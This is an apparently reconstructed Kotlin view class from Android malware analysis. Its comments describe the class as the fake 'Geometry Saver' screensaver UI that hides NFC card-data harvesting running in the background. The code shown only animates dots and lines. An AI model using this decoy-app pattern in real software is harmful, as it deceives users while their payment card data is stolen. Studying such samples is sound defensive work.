// orig: B2/w.java   (R8-renamed custom View)
//
// The entire visible "Geometry Saver" app. There is no real UI. This view
// exists purely to make the decoy app plausible as a screensaver/visualizer
// while NFC harvesting runs in the background.
//
// Draws 16 bouncing dots. Every unordered pair within 200 px gets a thin
// translucent connecting line — the "constellation" effect.
// Dot positions update on a background thread at ~60 FPS.

package xyz.happify.ckemv.ui

import android.content.Context
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.view.View

class DecoyView(context: Context) : View(context) {

    private val paint = Paint().apply {
        style       = Paint.Style.STROKE
        strokeWidth = 3f
        isAntiAlias = true
    }

    val dots = ArrayList<AnimationDot>()
    var animating = true

    init {
        val rng = java.util.Random()
        fun rand(lo: Int, hi: Int) = lo + rng.nextInt(hi - lo)

        repeat(16) {
            dots.add(AnimationDot(
                x      = rand(100, 500).toFloat(),
                y      = rand(100, 500).toFloat(),
                radius = rand(20, 80).toFloat(),
                vx     = rand(-10, 10).toFloat(),
                vy     = rand(-10, 10).toFloat(),
                color  = Color.rgb(rand(50, 255), rand(50, 255), rand(50, 255))
            ))
        }
        Thread(DecoyAnimationRunnable(this)).start()
    }

    override fun onDetachedFromWindow() {
        super.onDetachedFromWindow()
        animating = false
    }

    override fun onDraw(canvas: Canvas) {
        super.onDraw(canvas)
        canvas.drawColor(Color.parseColor("#121212"))

        // Draw each dot as a filled circle.
        for (dot in dots) {
            paint.color       = dot.color
            paint.strokeWidth = 3f
            canvas.drawCircle(dot.x, dot.y, dot.radius, paint)
        }

        // Draw constellation lines between dots within 200 px of each other.
        paint.color       = Color.parseColor("#33FFFFFF")
        paint.strokeWidth = 1f
        for (i in dots.indices) {
            for (j in i + 1 until dots.size) {
                val a = dots[i]; val b = dots[j]
                if (Math.hypot((b.x - a.x).toDouble(), (b.y - a.y).toDouble()) < 200.0) {
                    canvas.drawLine(a.x, a.y, b.x, b.y, paint)
                }
            }
        }
    }
}
